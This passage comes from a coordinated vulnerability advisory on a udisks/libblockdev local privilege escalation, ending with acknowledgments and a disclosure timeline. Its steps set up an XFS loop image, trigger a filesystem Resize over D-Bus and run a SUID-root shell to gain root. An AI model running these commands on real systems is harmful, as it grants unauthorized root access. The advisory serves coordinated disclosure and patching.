3/ We set up a loop device that is backed by our XFS image, but we first
make sure that "gvfs-udisks2-volume-monitor" is not running as our user
(otherwise it would automatically mount our XFS filesystem and prevent
the libblockdev from mounting it itself later):

------------------------------------------------------------------------
victim> killall -KILL gvfs-udisks2-volume-monitor

victim> udisksctl loop-setup --file ./xfs.image --no-user-interaction
Mapped file ./xfs.image as /dev/loop0.
------------------------------------------------------------------------

4/ We request the udisks daemon to resize our XFS filesystem, which
forces the libblockdev to mount it in /tmp without the nosuid and nodev
flags, but we first run a tight loop that will keep our XFS filesystem
busy and prevent it from being unmounted later by the libblockdev:

------------------------------------------------------------------------
victim> while true; do /tmp/blockdev*/bash -c 'sleep 10; ls -l /tmp/blockde=
v*/bash' && break; done 2>/dev/null &

victim> gdbus call --system --dest org.freedesktop.UDisks2 --object-path /o=
rg/freedesktop/UDisks2/block_devices/loop0 --method org.freedesktop.UDisks2=
.Filesystem.Resize 0 '{}'
Error: GDBus.Error:org.freedesktop.UDisks2.Error.Failed: Error resizing fil=
esystem on /dev/loop0: Failed to unmount '/dev/loop0' after resizing it: ta=
rget is busy

-r-sr-xr-x. 1 root root 1406608 May 13 09:42 /tmp/blockdev.RSM842/bash
------------------------------------------------------------------------

5/ Finally, we execute our SUID-root shell (from our XFS filesystem in
/tmp) and therefore obtain full root privileges:

------------------------------------------------------------------------
victim> mount
...
/dev/loop0 on /tmp/blockdev.RSM842 type xfs (rw,relatime,attr2,inode64,logb=
ufs=3D8,logbsize=3D32k,noquota)

victim> /tmp/blockdev*/bash -p

victim# id
uid=3D65534(nobody) gid=3D65534(nobody) euid=3D0(root) groups=3D65534(nobod=
y)
                                    ^^^^^^^^^^^^
------------------------------------------------------------------------


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Acknowledgments
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We thank SUSE (Alexander Bergmann, Thomas Blume, Valentin Lefebvre, in
particular) and Red Hat (Patrick Del Bello, Marco Benatto, Tomas Bzatek,
in particular) for their work on this release. We also thank the members
of the linux-distros@openwall (Salvatore Bonaccorso and Nick Tait in
particular) for their help with this release.

Finally, we thank Gergely Kalman for the following inspiring
presentation:

  https://gergelykalman.com/the-forgotten-art-of-filesystem-magic-alligator=
con-2024-slides.html


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Timeline
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

2025-05-14: We sent a draft of our advisory to SUSE (security@suse) and
Red Hat (secalert@redhat).

2025-06-09: We sent a draft of our advisory, and SUSE's and Red Hat's
patches, to the linux-distros@openwall.

2025-06-17: Coordinated Release Date (16:00 UTC).
